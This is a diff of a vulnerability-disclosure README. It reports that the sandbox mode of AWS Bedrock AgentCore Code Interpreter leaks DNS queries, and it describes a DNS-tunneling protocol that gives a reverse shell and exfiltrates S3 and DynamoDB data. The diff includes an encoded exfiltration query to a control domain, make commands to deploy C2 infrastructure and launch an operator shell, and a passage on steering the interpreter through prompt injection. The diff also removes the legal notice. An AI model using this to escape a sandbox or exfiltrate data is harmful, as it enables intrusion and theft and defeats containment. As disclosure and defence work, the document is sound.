@@ -4,7 +4,13 @@
 
 ## Summary
 
-AWS Bedrock AgentCore Code Interpreter's "Sandbox" network mode fails to properly isolate the environment from external network access. Despite being configured with no external network access, the sandboxed Code Interpreter can still make DNS queries, enabling **complete bypass of sandbox restrictions** by smuggling DNS-based command & control. Specifically, the Code Interpreter can query `A` and `AAAA` DNS records. During this research, I developed a DNS tunneling protocol that allows bidirectional communication via DNS queries and responses, enabling a full interactive reverse shell. Here is how it works.
+AWS Bedrock AgentCore Code Interpreter's "Sandbox" network mode fails to properly isolate the environment from external network access. Despite being configured with no external network access, the sandboxed Code Interpreter can still make DNS queries, enabling **complete bypass of sandbox restrictions** by smuggling DNS-based command & control. Specifically, the Code Interpreter can query `A` and `AAAA` DNS records. During this research, I developed a DNS tunneling protocol that allows bidirectional communication via DNS queries and responses, enabling a full interactive reverse shell.
+
+## Likelihood
+
+If you're wondering how likely this is to occur in practice, consider that chatbots often execute arbitrary Python code on behalf of the user; if an attacker can influence this code execution (via direct prompt injection or convincing the code interpreter to execute a separate script), the Code Interpreter is arguably functioning as designed. However, the "Sandbox" mode is supposed to be walled off from the internet - and is **not** working as designed due to the DNS query leakage. An attacker can leverage this code execution to exfiltrate data and execute commands outside the sandbox and establish a reverse shell using the protocol demonstrated here. As shown in the proof of concept, this includes the ability to exfiltrate sensitive data, such as exfiltrating data from S3 buckets or DynamoDB tables, as well as execute any AWS API calls permitted by the Code Interpreter's IAM role.
+
+## Technical Details
 
 ### Attack and Protocol Architecture
 
@@ -61,11 +67,7 @@ Large outputs split into multiple chunks (60 chars max per label):
   Chunk 22: 1.22.22.1256.dGVzLXVzLWVhc3QtMS00NDU1NzA5MjEyOTg-.1.sess_abc123.c2.bt-research-control.com
 ```
 
-## Likelihood
-
-If you're wondering how likely this is to occur in practice, consider that chatbots often execute arbitrary Python code on behalf of the user; if an attacker can influence this code execution (via direct prompt injection or convincing the code interpreter to execute a separate script), the Code Interpreter is arguably functioning as designed. However, the "Sandbox" mode is supposed to be walled off from the internet - and is **not** working as designed due to the DNS query leakage. An attacker can leverage this code execution to exfiltrate data and execute commands outside the sandbox and establish a reverse shell using the protocol demonstrated here. As shown in the proof of concept, this includes the ability to exfiltrate sensitive data, such as exfiltrating data from S3 buckets or DynamoDB tables, as well as execute any AWS API calls permitted by the Code Interpreter's IAM role.
-
-# Demo
+## Quick Start Guide
 
 ### Prerequisites
 
@@ -73,7 +75,7 @@ If you're wondering how likely this is to occur in practice, consider that chatb
 - Python 3.12
 - Terraform installed with the latest provider ()
 
-### Step 0: Deploy Infrastructure
+### Step 1: Deploy Infrastructure
 
 First, you will need to edit the `terraform/terraform.tfvars` file to set your domain name and AWS region. Set the following environment variables with your own domain and append them to `terraform/terraform.tfvars`:
 
@@ -98,7 +100,7 @@ source set_env_vars.sh
 make configure-ec2
 ```
 
-### Step 1: Start the interactive shell
+### Step 2: Start the Interactive Shell
 
 To run the interactive shell, you can use the following commands:
 
@@ -106,7 +108,7 @@ To run the interactive shell, you can use the following commands:
 make operator
 ```
 
-### Step 2: Verify DNS Exfiltration
+### Step 3: Verify DNS Exfiltration
 
 Now that you are in the interactive shell, you can verify that DNS exfiltration is working by executing these example commands.
 
@@ -240,7 +242,3 @@ Until AWS fixes the service:
   - Note: Without endpoint policies, attacker can exfiltrate via S3 access logs to attacker-controlled buckets
 - **Apply least-privilege IAM policies** to Code Interpreter roles (specific resources, not `*`)
 - **Monitor CloudWatch logs** for unexpected Code Interpreter activity
-
-## Legal
-
-This code is for security research and vulnerability disclosure. Submitted to AWS under their vulnerability disclosure program terms. Use in accordance with applicable laws and AWS Terms of Service.
